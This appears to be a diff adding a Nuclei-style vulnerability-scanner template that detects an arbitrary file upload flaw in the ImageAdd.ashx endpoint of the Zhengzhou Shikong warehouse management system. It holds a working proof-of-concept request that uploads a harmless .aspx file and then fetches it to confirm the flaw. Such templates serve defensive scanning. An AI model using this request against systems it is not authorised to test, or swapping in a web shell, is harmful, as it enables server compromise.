@@ -1,0 +1,61 @@
+id: poc-yaml-zzskzy-wms-imageadd-ashx-anyfile-upload
+info:
+  name: Zhengzhou Shikong Warehouse Management System ImageAdd.ashx Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in the ImageAdd.ashx endpoint of the Zhengzhou Shikong Warehouse Management System. Exploiting this vulnerability could allow attackers to upload arbitrary files to the server.
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+  dt1: "{{date_time('2006')}}"
+  dt2: "{{date_time('01')}}"
+  dt3: "{{date_time('02')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/ImageUpload/ImageAdd.ashx"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK"
+    body: |-
+      ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+      Content-Type: text/plain
+
+      {{t2}}
+      ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ".aspx"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/upload/{{dt1}}{{dt2}}{{dt3}}/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
